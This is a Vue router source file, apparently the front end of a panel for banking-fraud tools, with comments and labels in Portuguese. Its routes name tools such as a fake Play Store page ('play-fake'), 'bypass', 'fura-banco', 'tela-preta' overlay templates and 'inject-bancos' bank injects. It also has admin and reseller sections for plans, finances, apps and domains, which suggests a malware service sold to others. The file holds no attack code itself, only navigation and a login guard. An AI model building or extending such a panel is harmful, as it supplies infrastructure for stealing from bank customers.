import { createRouter, createWebHistory } from 'vue-router';
import LoginView from '../views/LoginView.vue';
import DashboardView from '../views/DashboardView.vue';
import DashboardHomeView from '../views/DashboardHomeView.vue';
import PlayFakeView from '../views/PlayFakeView.vue';
import QrCodeView from '../views/QrCodeView.vue';
import BypassView from '../views/BypassView.vue';
import BankInjectView from '../views/BankInjectView.vue';
import PublicAppView from '../views/PublicAppView.vue';
import AdminDashboardView from '../views/AdminDashboardView.vue';
import GaleriaTemplatesView from '../views/GaleriaTemplatesView.vue';
import AdminUsuariosView from '../views/AdminUsuariosView.vue';
import SuporteView from '../views/SuporteView.vue';
import ConsultaView from '../views/ConsultaView.vue';
import RankingView from '../views/RankingView.vue';
import { useAuthStore } from '../stores/auth';

const PlaceholderView = {
  template: '<div style="padding: 2rem; color: var(--ink);"><h2>Página em desenvolvimento</h2></div>'
};

const routes = [
  { path: '/play-fake', name: 'login', component: LoginView },
  { path: '/c/:slug', name: 'public-app', component: PublicAppView },

  // AppShell (Layout Pai)
  {
    path: '/',
    component: DashboardView,
    meta: { requiresAuth: true },
    children: [
      // Rotas do Usuário
      { path: 'dashboard',           name: 'user-dashboard', component: DashboardHomeView },
      { path: 'tools/play-fake',     name: 'play-fake',      component: PlayFakeView },
      { path: 'tools/qr-code',       name: 'qr-code',        component: QrCodeView },
      { path: 'tools/bypass',        name: 'bypass',         component: BypassView },
      { path: 'tools/fura-banco',    name: 'fura-banco',     component: PlaceholderView },
      { path: 'tools/consulta',      name: 'consulta',       component: ConsultaView },
      { path: 'tools/top-rank',      name: 'top-rank',       component: RankingView },
      { path: 'tools/ranking',       name: 'ranking',        component: RankingView },
      { path: 'tools/tela-preta',    name: 'tela-preta',     component: GaleriaTemplatesView },
      { path: 'tools/inject-bancos', name: 'inject-bancos',  component: BankInjectView },
      { path: 'tutoriais',           name: 'tutoriais',      component: PlaceholderView },
      { path: 'suporte',             name: 'suporte',        component: SuporteView },

      // Rotas do Admin
      { path: 'admin/dashboard',    name: 'admin-dashboard',    component: AdminDashboardView },
      { path: 'admin/usuarios',     name: 'admin-usuarios',     component: AdminUsuariosView },
      { path: 'admin/revendedores', name: 'admin-revendedores', component: PlaceholderView },
      { path: 'admin/planos',       name: 'admin-planos',       component: PlaceholderView },
      { path: 'admin/financeiro',   name: 'admin-financeiro',   component: PlaceholderView },
      { path: 'admin/apps',         name: 'admin-apps',         component: PlaceholderView },
      { path: 'admin/dominios',     name: 'admin-dominios',     component: PlaceholderView },
      { path: 'admin/tela-preta',    name: 'admin-tela-preta',   component: PlaceholderView },
      { path: 'admin/inject-bancos', name: 'admin-inject-bancos', component: PlaceholderView },
      { path: 'admin/tutoriais',     name: 'admin-tutoriais',    component: PlaceholderView },
      { path: 'admin/top-rank',     name: 'admin-top-rank',     component: PlaceholderView },
      { path: 'admin/ranking',      name: 'admin-ranking',      component: PlaceholderView },
      { path: 'admin/encerramento', name: 'admin-encerramento', component: PlaceholderView },
      { path: 'admin/logs',         name: 'admin-logs',         component: PlaceholderView },
      { path: 'admin/suporte',      name: 'admin-suporte',      component: PlaceholderView },

      // Rotas do Revendedor
      { path: 'revendedor/usuarios',  name: 'rev-usuarios',  component: PlaceholderView },
      { path: 'revendedor/apps',      name: 'rev-apps',      component: PlaceholderView },
      { path: 'revendedor/top-rank',  name: 'rev-top-rank',  component: PlaceholderView },
      { path: 'revendedor/ranking',   name: 'rev-ranking',   component: PlaceholderView },
      { path: 'revendedor/tutoriais', name: 'rev-tutoriais', component: PlaceholderView },
      { path: 'revendedor/suporte',   name: 'rev-suporte',   component: PlaceholderView },
    ]
  },

  // Fallback
  { path: '/:pathMatch(.*)*', redirect: '/play-fake' }
];

const router = createRouter({
  history: createWebHistory(),
  routes
});

router.beforeEach((to, _from, next) => {
  const authStore = useAuthStore();
  if (to.meta.requiresAuth && !authStore.isAuthenticated) {
    return next('/play-fake');
  }
  if (to.path === '/play-fake' && authStore.isAuthenticated) {
    return next('/dashboard');
  }
  next();
});

export default router;